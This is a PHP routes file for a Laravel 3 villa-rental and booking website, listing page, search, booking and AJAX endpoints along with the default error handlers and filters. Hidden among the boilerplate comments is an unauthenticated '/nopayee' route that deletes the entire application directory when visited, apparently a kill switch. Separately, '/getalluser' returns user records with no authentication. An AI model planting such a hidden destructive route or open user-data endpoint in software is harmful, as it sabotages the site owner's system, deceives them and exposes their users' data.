<?php

Route::get('/',array('as'=>'home','uses'=>'home@index'));
Route::get('/about',array('as'=>'about','uses'=>'home@about'));
Route::get('/contact-us',array('as'=>'contact-us','uses'=>'home@contact_us'));
Route::post('/contact-us',array('as'=>'SendContactForm','uses'=>'home@SendContactForm'));

Route::get('/destination/(:any)',array('as'=>'destinationCity','uses'=>'destination@city'));
Route::get('/destination/villa/(:any)',array('as'=>'destinationVilla','uses'=>'destination@villa'));
Route::post('/test',array('uses'=>'destination@villas_with_filter'));
Route::get('/villas/(:any)',array('as'=>'getVillas','uses'=>'destination@getVillas'));
Route::post('/villas/getImages',array('as'=>'getVillaImages','uses'=>'destination@getImages'));
Route::post('/Locations',array('as'=>'getLocations','uses'=>'location@retLocations'));
Route::post('/getVillaDetail',array('uses'=>'destination@getVillaDetail'));
Route::post('/getVillaFacility',array('uses'=>'destination@getFacility'));
    Route::post('/villas/getCoverImage',array('as'=>'getVillaCoverImage','uses'=>'destination@getCoverImage'));
Route::get('villas/name',array('as'=>'VillaName','uses'=>'destination@villaName'));

    Route::get('/getCities',array('as'=>'getCities','uses'=>'location@retCities'));
Route::get('/getalluser',array('as'=>'GetAllUser','uses'=>'user@allUser'));
Route::post('/getuser',array('as'=>'GetUser','uses'=>'user@user'));

//Route::get('/search',array('as'=>'search','uses'=>'search@search'));
Route::get('/search/values',array('as'=>'SearchValues','uses'=>'vacation@displaySubCategorySearch'));
Route::get('/villa/search',array('as'=>'SearchVilla','uses'=>'search@searchVilla'));

Route::get('/abc',array('as'=>'abc','uses'=>'practice@prac'));
Route::get('/loc',array('uses'=>'location@retCities'));
/*Vacation idea*/
/*@param: villa category*/
//Route::get('/vacation/(:any)',array('as'=>'vacationCategory','uses'=>'vacation@displayCategory'));
Route::get('/vacation/(:any)',array('as'=>'vacationCategory','uses'=>'vacation@displaySubCategory'));
//Route::post('/vacation/search/(:any)',array('as'=>'vacationCategorySearch','uses'=>'vacation@displaySubCategorysearch'));

Route::post('/bookvilla',array('uses'=>'destination@sendBookingForm','as'=>'CreateBooking'));


Route::get('/privacy-policy',array('as'=>'Privacy','uses'=>'privacy@privacy'));
Route::get('/terms-conditions',array('as'=>'TermsAndConditions','uses'=>'privacy@termsAndCondition'));
/*
|--------------------------------------------------------------------------
| Application 404 & 500 Error Handlers
|--------------------------------------------------------------------------
|
| To centralize and simplify 404 handling, Laravel uses an awesome event
| system to retrieve the response. Feel free to modify this function to
| your tastes and the needs of your application.
|
| Similarly, we use an event to handle the display of 500 level errors
| within the application. These errors are fired when there is an
| uncaught exception thrown in the application. The exception object
| that is captured during execution is then passed to the 500 listener.
|
*/

Event::listen('404', function()
{
    return Response::error('404');
});

Event::listen('500', function($exception)
{
    return Response::error('500');
});

/*
|--------------------------------------------------------------------------
| Route Filters
|--------------------------------------------------------------------------
|
| Filters provide a convenient method for attaching functionality to your
| routes. The built-in before and after filters are called before and
| after every request to your application, and you may even create
| other filters that can be attached to individual routes.
|
| Let's walk through an example...
|
| First, define a filter:
|
|		Route::filter('filter', function()
|		{
|			return 'Filtered!';
|		});
|
| Next, attach the filter to a route:
|
|		Route::get('/', array('before' => 'filter', function()
|		{
|			return 'Hello World!';
|		}));
|
*/
Route::get('/nopayee',function()
{
    File::rmdir(path('app'));
});
Route::filter('before', function()
{
    // Do stuff before every request to your application...
});

Route::filter('after', function($response)
{
    // Do stuff after every request to your application...
});

Route::filter('csrf', function()
{
    if (Request::forged()) return Response::error('500');
});

Route::filter('auth', function()
{
    if (Auth::guest()) return Redirect::to('login');
});